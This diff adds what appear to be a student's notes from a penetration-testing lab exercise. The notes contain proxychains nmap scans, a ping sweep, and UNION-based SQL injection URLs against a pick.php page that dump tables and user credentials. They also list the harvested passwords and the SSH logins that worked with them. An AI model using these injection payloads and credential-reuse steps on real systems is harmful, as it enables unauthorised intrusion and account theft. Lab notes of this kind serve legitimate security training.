@@ -1,0 +1,66 @@
+JOHA-005-M 
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+https://gtfobins.github.io/#
+
+for i in {0..31}; do /bin/ping 10.10.28.$i; done
+proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse
+proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+
+0) LinOps:	ssh student@10.50.40.22
+
+0) WinBox:  	ssh student@10.50.37.222
+
+1a) JumpBox:	ssh user2@10.50.28.37
+			10.10.28.20
+		user2=EaglesIsARE78
+		Aaron?
+		hostname> PublicFacingWebsite
+		ip a>
+			10.10.28.20/27
+
+		Port
+			22
+			80 ( SQL Injection )
+
+2a) 		ssh user2@192.168.28.181 WebApp
+		SQL Injection http://127.0.0.1:11001/pick.php?product=7%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables
+		
+		customer, net_products, purchase_history, users, shippingdates, $siteusers
+		
+		http://127.0.0.1:11001/pick.php?product=7%20UNION%20SELECT%20column_name,1,table_name%20FROM%20information_schema.columns
+		column_name: Servers
+		username:
+		password:
+		
+		http://127.0.0.1:11001/pick.php?product=7%20UNION%20SELECT%201,2,%20Username%20FROM%20users
+			:	users
+		User: Aaron, user2, user3, Lroth
+		Password: ncnffjbeqlCn$$jbeq, RntyrfVfNER78, Obo4GURRnccyrf, anotherpassword4THEages
+		
+		table = users, hosts
+		columns = User, Password
+		schema = performance_schema 	
+		
+		table_name = users
+		column_name = Username, Password, Port, Socket
+		
+		tn: 	customer
+			users
+			
+		
+		cn: dummy
+		1) ssh Aaron@192.168.28.181 -> apasswordyPa$$word X
+		2) ssh user2@192.168.28.181 -> EaglesIsARE78 X
+		3) ssh user3@192.168.28.181 -> Bob4THEEapples X
+		4) ssh Lroth@192.168.28.181 -> anotherpassword4THEages, nabgurecnffjbeq4GURntrf
+		
+		Ports)
+			22
+			80
+
+11100-11199
+
+11001 Lin -> 28.181 ( Web App ) 80
+
